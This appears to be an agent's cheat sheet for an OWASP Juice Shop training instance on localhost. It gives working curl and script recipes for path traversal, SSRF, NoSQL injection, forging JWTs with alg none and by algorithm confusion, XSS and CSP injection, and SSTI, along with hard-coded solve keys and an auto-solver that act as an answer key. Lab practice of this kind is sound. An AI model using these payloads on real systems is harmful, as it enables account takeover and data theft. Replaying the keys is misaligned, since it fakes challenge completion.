# Juice Shop Quick-Wins (Verified Recipes)

Contents: [0) Doctrines](#0-operational-doctrines-these-prevent-80-of-failures) ([0.4 phantom wipe](#04-day-297-phantom-wipe-ui-illusion)) • [1) Unsolved list](#1-ground-truth-list-unsolved-challenges) • [2) Logins](#2-login-helpers-default-demo-accounts) • [3) Recipes](#3-high-roi-challenge-recipes) • [4) Complaint keywords](#4-complaint-keyword-solves-batch) • [5) /ftp notes](#5-notes-on-ftp-instability) • [6) Troubleshooting](#6-troubleshooting)

Assumptions:

```bash
BASE=http://127.0.0.1:3000
```

## 0) Operational doctrines (these prevent 80% of failures)

### 0.1 Auth-context mismatch (CRITICAL)
Some endpoints require **cookie auth** and will ignore Bearer auth (or behave oddly).

- Cookie auth:
  - `Cookie: token=<JWT>`
  - Seen required for: `/profile*`, `/dataerasure`, and (notably) some `/rest/user/whoami` behaviors.

- Bearer auth:
  - `Authorization: Bearer <JWT>`
  - Seen required for many `/rest/*` and `/api/*` endpoints.

If an exploit “should work” but you see 401/500/empty user objects, **switch auth scheme**.

### 0.2 Prefer file-based parsing over pipes
`curl | python` can truncate and produce `curl: (23) write error`. Prefer:

```bash
curl -sS -o /tmp/ch.json $BASE/api/Challenges
python3 scripts/list_unsolved.py /tmp/ch.json
```

### 0.3 Endpoint flakiness
In this environment `/ftp` and sometimes `/support/logs` can be slow/partial.
Use larger timeouts (or Python `requests`) rather than assuming the exploit is wrong.

### 0.4 Day 297 “phantom wipe” UI illusion
Always treat `GET /api/Challenges` as the ground truth. If the UI shows `0/110` but the API shows solved challenges, do **not** run recovery/reset scripts—assume the UI is lying.
If both the UI and API look fresh, verify whether you’re on a brand-new instance (new port/PID/hash) versus a UI cache glitch on the same backend.

Quick state check:

```bash
curl -sS -o /tmp/ch.json "$BASE/api/Challenges"
python3 - <<'PY'
import json,sys
with open("/tmp/ch.json") as f:
    data=json.load(f)
ch=data.get('data', data)
total=len(ch)
solved=sum(1 for c in ch if c.get('solved'))
print(f"solved: {solved}/{total}")
print(f"unsolved: {total-solved}")
PY
```

Instance fingerprinting:

```bash
netstat -plnt | grep ':3000'  # expect: tcp6       0      0 :::3000                 :::*                    LISTEN      3053518/node

curl -sS -o /tmp/admin-login.json "$BASE/rest/user/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'

TOKEN=$(python3 - <<'PY'
import json
with open("/tmp/admin-login.json") as f:
    print(json.load(f)['authentication']['token'])
PY
)

curl -sS -H "Authorization: Bearer $TOKEN" -o /tmp/appcfg.json "$BASE/rest/admin/application-configuration"
python3 - <<'PY'
import json, hashlib
with open("/tmp/appcfg.json") as f:
    cfg=json.load(f)["config"]
blob=json.dumps(cfg, sort_keys=True, separators=(",", ":")).encode()
print("rest_admin_appcfg_sha256:", hashlib.sha256(blob).hexdigest())
PY
```

---

## 1) Ground truth: list unsolved challenges

```bash
curl -sS -o /tmp/ch.json $BASE/api/Challenges
python3 scripts/list_unsolved.py /tmp/ch.json
```

Coding challenges auto-solver (uses snippets API; obeys the phantom-wipe guard and aborts if `/api/Challenges` shows everything solved unless `--force`/`FORCE=1`):

```bash
./scripts/js_quickwins.sh coding-fixes --dry-run
# add --only key1,key2 if you need to target specific coding challenges
```

---

## 2) Login helpers (default demo accounts)

### 2.1 Admin login (for training)

```bash
LOGIN=$(curl -sS -X POST $BASE/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}')

TOKEN=$(python3 - <<'PY' <<<"$LOGIN"
import json,sys
print(json.loads(sys.stdin.read())['authentication']['token'])
PY)

echo "TOKEN=$TOKEN" | sed 's/./*/g' >/dev/null  # don’t print tokens in shared logs
```

(We intentionally avoid printing live JWTs into terminal history if we don’t need them.)

---

## 3) High-ROI challenge recipes

### 3.1 Email leak (JSONP)

```bash
curl -sS "$BASE/rest/user/whoami?callback=foo" \
  -H "Authorization: Bearer $TOKEN"
```

### 3.2 Deprecated interface (upload any .xml/.yml)

```bash
echo '<x>1</x>' > /tmp/x.xml
curl -sS -i -X POST "$BASE/file-upload" -F "file=@/tmp/x.xml"
```

### 3.3 Access log disclosure

Fetch `/support/logs`, find a link containing `access.log`, then download it.
Note: the href sometimes includes a prefix like `logs/`, so **use basename**.

```bash
FILE=$(curl -sS "$BASE/support/logs" | python3 - <<'PY'
import re,sys,os
html=sys.stdin.read()
m=re.search(r'href="([^"]*access\.log[^"]*)"', html)
print(os.path.basename(m.group(1)) if m else '')
PY)

echo "logfile=$FILE"
[ -n "$FILE" ] && curl -sS "$BASE/support/logs/$FILE" | head
```

### 3.4 Missing encoding (must encode `#` as `%23`)

```bash
curl -sS -I \
  "$BASE/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
```

### 3.5 LFR via data erasure (path traversal)

**Cookie auth** + form encoding. This call may also clear the auth cookie as a side effect.

```bash
curl -sS -o /dev/null -D - -X POST "$BASE/dataerasure" \
  -H "Cookie: token=$TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'layout=../package.json' \
  --data-urlencode 'email=x' \
  --data-urlencode 'securityAnswer=x'
```

### 3.6 SSRF (multipart required)

**Cookie auth** + `curl -F` (multipart) + absolute URL.

```bash
curl -sS -i -X POST "$BASE/profile/image/url" \
  -H "Cookie: token=$TOKEN" \
  -F "imageUrl=$BASE/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3" \
  | head
```

### 3.7 NoSQL timing attack (sleep cap workaround)

Single sleeps may be capped. Use two sleeps to exceed the threshold:

```bash
curl -sS \
  "$BASE/rest/products/1%20%7C%7C%20sleep(2000)%20%7C%7C%20sleep(2000)/reviews" \
  | head
```

### 3.8 JWT “none” algorithm: **cookie-only behavior gotcha**

On this environment:
- `Authorization: Bearer <unsigned>` to `/rest/user/whoami` returned an empty user.
- **`Cookie: token=<unsigned>`** returned the forged admin user.

```bash
h='{"typ":"JWT","alg":"none"}'
p='{"status":"success","data":{"id":1,"email":"admin@juice-sh.op","role":"admin"},"iat":0}'
H=$(printf %s "$h"|base64 -w0|tr '+/' '-_'|tr -d '=')
P=$(printf %s "$p"|base64 -w0|tr '+/' '-_'|tr -d '=')
TOK="$H.$P."

curl -sS "$BASE/rest/user/whoami" -H "Cookie: token=$TOK"
```

### 3.9 Forged Signed JWT (HS256 signed with RSA public key as secret)

This challenge is solved by abusing an algorithm confusion scenario: create a JWT with header `alg=HS256` and sign it using the server's **RSA public key** (`encryptionkeys/jwt.pub`) as the HMAC secret.

Important: the verifier middleware only extracts JWTs from the **Bearer** header (not cookies).

```bash
# Run from the Juice Shop repo so we can read encryptionkeys/jwt.pub
cd /home/computeruse/juice-shop
BASE=http://127.0.0.1:3000

TOK=$(node - <<'NODE'
const jwt=require('jsonwebtoken');
const fs=require('fs');
const key=fs.readFileSync('encryptionkeys/jwt.pub','utf8');
console.log(jwt.sign({data:{email:'rsa_lord@juice-sh.op'}}, key, {algorithm:'HS256'}));
NODE
)

# Hit any endpoint to trigger the global jwtChallenges middleware
curl -sS "$BASE/rest/user/whoami" -H "Authorization: Bearer $TOK" > /dev/null
```

### 3.10 HTTP header XSS (hybrid)

1) Save the payload via header:

```bash
curl -sS "$BASE/rest/saveLoginIp" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'True-Client-IP: <iframe src="javascript:alert(`xss`)">' \
  | head
```

2) Then visit the page in the browser UI:
- `/#/privacy-security/last-login-ip`

### 3.11 Username XSS via CSP poison (hybrid)

1) Poison CSP via profile image URL (form-encoded; cookie auth):

```bash
curl -sS -i -X POST "$BASE/profile/image/url" \
  -H "Cookie: token=$TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "imageUrl=https://example.com; script-src 'unsafe-inline'" \
  | head
```

### 3.12 SSTI unblock (cookie + server-rendered `/profile`)

- `/rest/user/login` returns the JWT in JSON and may **not** set `Set-Cookie`; the SPA then stores it in `localStorage`, which the server-rendered `/profile` does not send.
- `/profile` endpoints on this build demand `Cookie: token=<JWT>`; `Authorization: Bearer <JWT>` produces HTTP 500 `Blocked illegal activity`.
- Minimal curl repro (demo creds):

```bash
LOGIN=$(curl -sS -X POST "$BASE/rest/user/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}')
TOKEN=$(python3 - <<'PY' <<<"$LOGIN"
import json,sys
print(json.loads(sys.stdin.read())['authentication']['token'])
PY)

curl -sS -X POST "$BASE/profile" \
  -H "Cookie: token=$TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'username=#{7*7}'

curl -sS "$BASE/profile" -H "Cookie: token=$TOKEN" | head -n 5  # triggers regex /#{(.*)}/ and sets abused_ssti_bug
curl -i -sS "$BASE/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3" | head -n 1  # expect HTTP 204; HTML 200 means not triggered
```

- Browser workaround: in devtools run `document.cookie='token='+TOKEN` then visit `/profile` (server-rendered, **not** `/#/profile`).

2) Set username with hex-escaped `<script>` (form-encoded; cookie auth):

```bash
curl -sS -i -X POST "$BASE/profile" \
  -H "Cookie: token=$TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "username=#{'\x3cscript>alert(`xss`)\x3c/script>'}" \
  | head
```

3) Trigger by visiting `/#/profile` in the browser.

### 3.12 Web3: Wallet Depletion (historical fallback)

The server has a fallback that checks Sepolia logs for a `ContractExploited(address indexed)` event tied to the submitted wallet address.

Important gotchas:

- The route always replies with "Event Listener Created" even when **not solved**.
- The fallback log search is hard-capped to the **last ~49,000 blocks**. Any “known culprit address” will eventually age out.
- If the server is configured with an Alchemy free-tier HTTP RPC (`ALCHEMY_HTTP_URL`), `eth_getLogs` is limited to a **10 block range**, which effectively breaks the fallback and can cause endless “Event Listener Created” loops.

```bash
BASE=http://127.0.0.1:3000
curl -sS -X POST "$BASE/rest/web3/walletExploitAddress" \
  -H 'Content-Type: application/json' \
  -d '{"walletAddress":"0x3692B35006917B545B50d2a4757f5F272cd48ADe"}'
```

If the above doesn’t solve:

- **Restart Juice Shop once** (re-attaches the WS listener), then re-POST.
- If you can control env, prefer an RPC that allows wide `getLogs` ranges, e.g.
  `ALCHEMY_HTTP_URL=https://ethereum-sepolia-rpc.publicnode.com`
- Otherwise you must submit a **recent** culprit address (event within last 49k blocks) or trigger a fresh exploit tx while the WS listener is active.

### 3.13 Web3: Mint the Honey Pot (known NFT-holding wallet)

The verify endpoint checks `balanceOf(wallet)>0` (with timeouts/fallbacks). This wallet has an NFT and returns `success:true` in this environment:

Note: this endpoint can be flaky (Sepolia RPC timeouts). If you see a false negative like `success:false` / `Wallet did not mint the NFT`, retry a few times (serially; avoid parallel calls).

```bash
BASE=http://127.0.0.1:3000
curl -sS -X POST "$BASE/rest/web3/walletNFTVerify" \
  -H 'Content-Type: application/json' \
  -d '{"walletAddress":"0x8343d2eb2B13A2495De435a1b15e85b98115Ce05"}'
```

---

## 4) Complaint-keyword solves (batch)

These challenges auto-solve when an **admin** submits complaints containing verifier keywords. Use training/demo admin tokens only. The exact endpoint/UI path can shift by version; expect either `/api/Complaints` or the UI complaint form to work with Bearer auth.

Verified keywords (strings must appear in the complaint):

- `pickle rick`
- `sanitize-html 1.4.2`
- `epilogue-js`
- `ngy-cookie`
- `eslint-scope/issues/39`
- `6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie`
- `hueteroneel eurogium edule`

---

## 5) Notes on `/ftp` instability

If `/ftp` downloads time out or partially transfer, try:

- `curl --max-time 60 --retry 2 --retry-delay 1 ...`
- or a Python `requests.get(url, timeout=60)` script.

---

## 6) Troubleshooting

- `/ftp` or `/support/logs` timeouts: raise timeouts/retries; consider `curl -o file` then parse locally.
- Empty user object/500s: switch between Cookie vs Bearer auth, and between JSON vs form encoding.

---

## 7) Coding challenges automation (31/31)

Juice Shop includes a set of interactive 'Coding Challenges'. You can solve all of them via the public snippets API endpoints:
- `POST /snippets/verdict`
- `POST /snippets/fixes`

This repo ships a conservative automation helper:

```bash
BASE=http://127.0.0.1:3000
./scripts/js_quickwins.sh coding-fixes

# Safer preview
./scripts/js_quickwins.sh coding-fixes --dry-run

# Subset
./scripts/js_quickwins.sh coding-fixes --only scoreBoardChallenge,loginAdminChallenge
```

Safety guard: it checks `GET /api/Challenges` and refuses to run on fully-solved instances unless `FORCE=1` or `--force`.
